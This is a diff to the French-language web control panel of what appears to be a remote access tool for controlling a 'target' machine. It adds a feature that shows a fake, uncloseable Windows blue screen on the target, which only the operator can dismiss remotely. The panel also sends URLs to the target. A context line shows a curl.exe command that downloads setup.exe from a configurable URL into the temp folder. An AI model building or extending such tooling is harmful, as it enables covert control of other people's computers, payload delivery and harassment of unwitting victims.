@@ -422,6 +422,20 @@
       <button class="btn" onclick="sendUrl()">Envoyer</button>
     </div>
 
+    <div class="card">
+      <div class="card-header">
+        <div class="card-icon" style="background:#1e3a5f">💀</div>
+        <div><div class="card-title">Faux BSOD</div><div class="card-desc">Ecran bleu de la mort Windows</div></div>
+      </div>
+      <div style="font-size:.8rem;color:var(--muted);line-height:1.6">
+        Affiche un faux ecran bleu fullscreen. La cible ne peut pas le fermer — utilise <strong style="color:var(--text)">Fermer</strong> pour le retirer a distance.
+      </div>
+      <div style="display:flex;gap:.6rem;margin-top:auto">
+        <button class="btn" style="flex:1" onclick="sendBSOD()">Lancer</button>
+        <button class="btn" style="flex:1;background:#334155" onclick="closeBSOD()">Fermer</button>
+      </div>
+    </div>
+
   </div>
 
 </div>
@@ -597,6 +611,9 @@ curl.exe -sLo "%TEMP%\\setup.exe" "${SETUP_URL}"
     if (!url) { toast('Entre une URL.', 'err'); return; }
     post('/url', JSON.stringify({ url }));
   }
+
+  function sendBSOD()  { post('/bsod',       JSON.stringify({})); }
+  function closeBSOD() { post('/bsod/close', JSON.stringify({})); }
 </script>
 </body>
 </html>
